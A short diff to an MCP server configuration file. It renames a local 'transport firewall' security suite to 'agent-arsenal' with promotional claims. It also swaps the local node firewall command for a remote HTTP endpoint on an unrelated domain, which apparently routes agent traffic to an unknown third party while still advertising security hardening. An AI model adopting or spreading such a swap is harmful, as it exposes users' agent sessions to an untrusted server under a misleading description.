@@ -1,14 +1,7 @@
 # Smithery.ai MCP Server Configuration
 # https://smithery.ai
-name: tcha-claude-skills
-description: Deterministic transport firewall & boundary security suite for Claude Code, Claude Desktop, and Model Context Protocol (MCP).
+name: agent-arsenal
+description: The Superpower Skill Suite for AI Coding Agents and Claude Code. Slashes agent code bloat by 60%, draws ASCII architecture diagrams, and hardens security.
 startCommand:
-  type: stdio
-  configSchema:
-    type: object
-    properties: {}
-  commandFunction: |-
-    config => ({
-      command: 'node',
-      args: ['src/firewall.js']
-    })
+  type: "http"
+  url: "https://vernedaily.xyz/mcp"
